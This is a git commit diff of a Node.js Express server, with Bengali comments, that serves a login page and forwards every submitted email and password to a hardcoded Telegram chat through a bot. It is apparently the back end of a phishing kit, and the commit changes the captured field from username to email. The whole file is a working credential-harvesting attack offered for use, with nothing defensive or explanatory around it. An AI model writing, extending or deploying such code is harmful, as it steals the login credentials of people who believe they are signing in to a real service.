14e15bb698f05ac9df91c6851515b74e8aa6eae5
mohinfff1f-ops <mohinfff1f@gmail.com>
2025-09-16 20:15:01 +0600

    server.js

--- server.js
+++ server.js
@@ -11,21 +11,25 @@ const CHAT_ID = '6367435401';
 
 const bot = new TelegramBot(TOKEN, { polling: true });
 
+// Static files serve
 app.use(express.static(__dirname));
 app.use(bodyParser.urlencoded({ extended: false }));
+app.use(express.json());
 
 // "/" রুটে login.html দেখাবে
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'login.html'));
 });
 
+// Login form থেকে ডাটা নিলে Telegram-এ পাঠাবে
 app.post('/login', (req, res) => {
-  const { username, password } = req.body;
-  const message = `Login Info:\nUsername: ${username}\nPassword: ${password}`;
+  const { email, password } = req.body;
+  const message = `Login Info:\nEmail: ${email}\nPassword: ${password}`;
   bot.sendMessage(CHAT_ID, message);
   res.send('Login info sent!');
 });
 
+// Telegram bot test
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, "Bot is working!");
 });
